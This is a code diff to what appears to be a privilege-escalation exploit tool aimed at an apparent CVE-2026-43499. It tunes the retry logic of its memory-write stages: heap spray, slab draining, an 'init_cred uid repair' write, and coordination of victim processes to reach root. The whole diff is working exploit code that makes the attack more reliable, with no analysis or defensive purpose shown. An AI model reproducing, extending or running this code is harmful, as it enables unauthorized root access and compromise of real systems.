@@ -257,7 +257,8 @@ namespace ghostlock::session::backend {
             void *context,
             int32_t leaf,
             const memory::WriteRequest *post_write = nullptr,
-            const char *post_stage = nullptr) {
+            const char *post_stage = nullptr,
+            write_stage_pre_write_fn pre_write = nullptr) {
 
             /* no attempt can move a target that is wrong by construction, and the
              * stage belongs in the log with the address rather than the route */
@@ -279,14 +280,25 @@ namespace ghostlock::session::backend {
 
                 /* the previous attempt's write can land after its verify read; check
                  * before paying for another heap spray */
-                if (attempt > 1 && verify(context)) {
-                    return true;
+                if (attempt > 1) {
+                    const int32_t early = verify(context);
+                    if (early > 0) {
+                        return true;
+                    }
+                    if (early < 0) {
+                        pr_warning("[T+%.0fms] %s attempt %u: the target is gone; "
+                                   "not retrying\n", attack::timer_ms(), stage, attempt);
+                        return false;
+                    }
                 }
                 if (attempt == 1) {
                     attack::slab_drain();
                 }
                 if (static_cast<memory::WriteMode>(mode) == memory::WriteMode::Credential) {
                     if (!M::w2_fast_repair_prebuild(session)) return false;
+                }
+                if (pre_write != nullptr) {
+                    (void) pre_write(context);
                 }
                 Status routed = Cve2026_43499Policy::template attack_write<M>(session, request, stage);
                 if (!routed) {
@@ -315,7 +327,13 @@ namespace ghostlock::session::backend {
                     }
                 }
                 if (settle_usec) usleep(settle_usec);
-                if (verify(context)) return true;
+                const int32_t verified = verify(context);
+                if (verified > 0) return true;
+                if (verified < 0) {
+                    pr_warning("[T+%.0fms] %s attempt %u: the target is gone; "
+                               "not retrying\n", attack::timer_ms(), stage, attempt);
+                    return false;
+                }
                 /* The route returned without error but the write is not there.
                  * This used to fall through in silence, so the next line in the
                  * log was "attempt N+1" -- indistinguishable from a route that
@@ -328,7 +346,7 @@ namespace ghostlock::session::backend {
                 usleep(50000);
             }
             /* the last write can land after its verify read */
-            return verify(context) != 0;
+            return verify(context) > 0;
         }
 
         /* W3 chain retry: park the previous rooted child on its command pipe so the
@@ -515,8 +533,13 @@ namespace ghostlock::session::backend {
                 g_exploit_session.profile.w2_settle_us(),
                 victim::verify_w2_stage, &w2_context, 0,
                 have_w2_repair ? &w2_repair : nullptr,
-                "W2: init_cred uid repair");
+                "W2: init_cred uid repair",
+                victim::arm_w2_spin);
             if (!got_root) {
+                /* the last verify may have re-armed the spin for a retry the
+                 * stage is now abandoning: release it before the 'X', or the
+                 * victim never reads the command. */
+                victim::release_victim_spin(w2_context);
                 write(pipes.cmd_write.get(), "X", 1);
                 pipes.cmd_write.reset();
                 pipes.uid_read.reset();
